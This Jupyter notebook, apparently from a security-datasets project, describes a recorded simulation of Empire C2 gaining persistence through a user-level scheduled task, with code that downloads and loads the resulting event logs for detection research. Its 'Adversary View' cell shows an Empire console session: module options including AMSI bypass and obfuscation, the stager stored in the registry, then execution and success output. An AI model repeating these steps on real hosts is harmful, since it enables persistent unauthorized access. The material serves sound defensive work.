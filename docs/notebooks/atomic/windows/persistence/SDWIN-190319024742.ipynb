{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d725144e",
   "metadata": {},
   "source": [
    "# Empire Userland Scheduled Tasks"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "101e23ed",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cfefbab0",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/03/19 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003) |\n",
    "| Techniques        | [T1053.005](https://attack.mitre.org/techniques/T1053/005) |\n",
    "| Tags              | Local Scheduled Tasks |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a3a9fdb5",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries creating and/or executing local scheduled tasks to maintain persistence in an environment."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "68d43a5e",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "31ba4ee0",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_schtasks_creation_standard_user.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_schtasks_creation_standard_user.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3e7e8677",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "417aacf6",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9012cf92",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [schtasks](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a446b4e4",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n",
    "\n",
    "3MWPS8L6 ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         7312   5/0.0    2020-09-21 07:12:36  http            \n",
    "\n",
    "(Empire: agents) > interact 3MWPS8L6         \n",
    "(Empire: 3MWPS8L6) > usemodule persistence/userland/schtasks\n",
    "(Empire: powershell/persistence/userland/schtasks) > info\n",
    "\n",
    "              Name: Invoke-Schtasks\n",
    "            Module: powershell/persistence/userland/schtasks\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @mattifestation\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Persist a stager (or script) using schtasks. This has a\n",
    "  moderate detection/removal rating.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n",
    "  rsistence/Persistence.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        3MWPS8L6                  Agent to run module on.                 \n",
    "  Listener         False                                 Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  DailyTime        False       09:00                     Daily time to trigger the script        \n",
    "                                                        (HH:mm).                                \n",
    "  IdleTime         False                                 User idle time (in minutes) to trigger  \n",
    "                                                        script.                                 \n",
    "  TaskName         True        Updater                   Name to use for the schtask.            \n",
    "  RegPath          False       HKCU:\\Software\\Microsoft  Registry location to store the script   \n",
    "                              \\Windows\\CurrentVersion\\  code. Last element is the key name.     \n",
    "                              debug                   \n",
    "  ADSPath          False                                 Alternate-data-stream location to store \n",
    "                                                        the script code.                        \n",
    "  ExtFile          False                                 Use an external file for the payload    \n",
    "                                                        instead of a stager.                    \n",
    "  Cleanup          False                                 Switch. Cleanup the trigger and any     \n",
    "                                                        script from specified location.         \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/persistence/userland/schtasks) > set Listener http\n",
    "(Empire: powershell/persistence/userland/schtasks) > set TaskName MordorSchtask\n",
    "(Empire: powershell/persistence/userland/schtasks) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked 3MWPS8L6 to run TASK_CMD_WAIT\n",
    "[*] Agent 3MWPS8L6 tasked with task ID 1\n",
    "[*] Tasked agent 3MWPS8L6 to run module powershell/persistence/userland/schtasks\n",
    "(Empire: powershell/persistence/userland/schtasks) > \n",
    "SUCCESS: The scheduled task \"MordorSchtask\" has successfully been created.\n",
    "Schtasks persistence established using listener http stored in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\debug with MordorSchtask daily trigger at 09:00.\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74c3111d",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "905a1d71",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d71bcfd3",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_schtasks_creation_standard_user.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "624d1603",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0c6a8509",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "af1d32b3",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d276494",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5acf09dc",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://docs.microsoft.com/en-us/windows/win32/netmgmt/user-functions](https://docs.microsoft.com/en-us/windows/win32/netmgmt/user-functions) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
